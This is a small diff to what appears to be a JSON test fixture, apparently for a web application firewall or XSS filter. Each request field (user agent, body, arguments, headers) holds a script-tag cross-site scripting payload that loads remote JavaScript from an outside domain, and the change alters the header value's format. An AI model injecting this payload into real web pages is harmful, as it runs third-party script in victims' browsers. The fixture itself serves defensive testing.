@@ -5,7 +5,7 @@
       "UA": "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>",
       "Body": "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>",
       "ARGS": "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>",
-      "Headers": "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>"
+      "Headers": "CustomHeader: <SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>"
     }
   ]
 }
